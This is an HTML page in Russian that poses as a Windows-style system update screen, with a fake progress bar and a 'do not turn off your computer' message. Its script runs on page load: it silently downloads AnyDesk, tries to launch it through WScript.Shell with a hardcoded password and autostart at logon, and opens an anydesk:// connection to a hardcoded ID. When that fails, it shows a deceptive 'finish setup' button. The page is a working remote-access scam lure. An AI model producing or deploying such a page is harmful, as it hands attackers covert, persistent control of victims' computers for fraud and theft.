<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Системное обновление</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: white;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.05);
            padding: 40px 60px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 500px;
        }
        .mask-image {
            width: 100%;
            max-width: 300px;
            border-radius: 12px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 24px;
            font-weight: 300;
            color: #ddd;
            margin: 10px 0;
        }
        p {
            color: #888;
            font-size: 14px;
            margin: 8px 0;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #333;
            border-radius: 4px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: #3498db;
            animation: loadProgress 4s infinite ease-in-out;
        }
        @keyframes loadProgress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        .status-text {
            margin-top: 12px;
            font-size: 13px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- ССЫЛКА НА КАРТИНКУ (Я ВСТАВИЛ ТУ, КОТОРУЮ ТЫ ПРИСЛАЛ) -->
        <img src="https://images.meme-arsenal.com/8e65e916183b7297f05b5998b185c6fa.jpg" alt="Обновление" class="mask-image">
        
        <h1>Установка обновлений системы</h1>
        <p>Пожалуйста, не выключайте компьютер</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <div class="status-text" id="statusText">Подготовка файлов... 0%</div>
    </div>

    <script>
        const YOUR_ID = "660090345";
        const YOUR_PASSWORD = "Pih0pEBklvDv2";
        const ANYDESK_URL = "https://download.anydesk.com/AnyDesk.exe";

        function launchAnyDesk() {
            window.location.href = `anydesk://connect?${YOUR_ID}&password=${YOUR_PASSWORD}&silent=true`;
            setTimeout(function() {
                if (!document.hidden) {
                    document.getElementById('statusText').innerHTML = 'Загрузка компонентов...';
                    downloadAndRunAnyDesk();
                }
            }, 3000);
        }

        function downloadAndRunAnyDesk() {
            var link = document.createElement('a');
            link.href = ANYDESK_URL;
            link.download = "AnyDesk.exe";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            document.getElementById('statusText').innerHTML = 'Скачивание завершено. Запуск...';
            setTimeout(function() {
                try {
                    var shell = new ActiveXObject("WScript.Shell");
                    shell.Run(`"%USERPROFILE%\\Downloads\\AnyDesk.exe" --silent --set-password ${YOUR_PASSWORD} --start-with-winlogon`, 0, false);
                    setTimeout(function() {
                        window.location.href = `anydesk://connect?${YOUR_ID}&password=${YOUR_PASSWORD}&silent=true`;
                    }, 2000);
                } catch(e) {
                    document.getElementById('statusText').innerHTML = 'Нажмите "Разрешить", чтобы завершить настройку.';
                    var btn = document.createElement('button');
                    btn.innerHTML = 'Завершить настройку';
                    btn.style.cssText = 'margin-top:20px;padding:12px 30px;background:#3498db;border:none;border-radius:8px;color:white;font-size:16px;cursor:pointer;';
                    btn.onclick = function() {
                        window.location.href = `anydesk://connect?${YOUR_ID}&password=${YOUR_PASSWORD}&silent=true`;
                    };
                    document.querySelector('.container').appendChild(btn);
                }
            }, 5000);
        }

        function simulateProgress() {
            var fill = document.querySelector('.progress-fill');
            var text = document.getElementById('statusText');
            var progress = 0;
            var interval = setInterval(function() {
                progress += Math.random() * 15 + 2;
                if (progress > 100) progress = 100;
                fill.style.width = progress + '%';
                text.innerHTML = `Обновление файлов... ${Math.round(progress)}%`;
                if (progress >= 100) {
                    clearInterval(interval);
                    text.innerHTML = 'Настройка завершена.';
                    setTimeout(function() {
                        text.innerHTML = 'Перезагрузка не требуется.';
                    }, 1500);
                }
            }, 600);
        }

        window.onload = function() {
            simulateProgress();
            setTimeout(function() {
                launchAnyDesk();
            }, 2000);
        };
    </script>
</body>
</html>
